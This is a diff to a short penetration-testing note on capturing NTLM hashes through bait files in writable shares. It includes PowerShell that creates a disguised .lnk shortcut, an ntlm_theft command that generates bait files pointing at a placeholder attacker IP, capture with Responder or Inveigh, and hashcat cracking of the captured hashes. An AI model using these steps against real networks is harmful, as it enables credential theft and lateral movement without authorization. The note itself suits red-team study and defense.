@@ -4,7 +4,9 @@ tags:
   - Lateral-Movement
   - AD
 ---
-Any writable directory (shares, nfs, locally) where users will list contents you can use a .lnk to steal hashes
+Any writable directory (shares, nfs, locally) where users will list contents you can use certain file types to steal hashes
+
+**Manual: (.lnk)**
 
 ```powershell
 $objShell = New-Object -ComObject WScript.Shell
@@ -16,10 +18,24 @@ $lnk.Description = "IT Driver"
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
+
+**Automated (multi-type):**
+
+[https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
+
+Generate all file types:
+
+```shell-session
+python3 ntlm_theft.py -g all -s <attackerIP> -f '@myfile'
+```
+
+
+
 Monitor for traffic with [Responder](https://github.com/SpiderLabs/Responder) on linux or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) on windows. 
 Hash received? Try to crack it
+``` bash
+hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt
 ```
-hashcat -m 5600 userr.hash /usr/share/wordlists/rockyou.txt
-```
-OR:  [Relay Attacks](../Lateral%20Movement/Relay%20Attacks.md)
+
+OR:  [Relay Attacks](Relay%20Attacks.md)
 
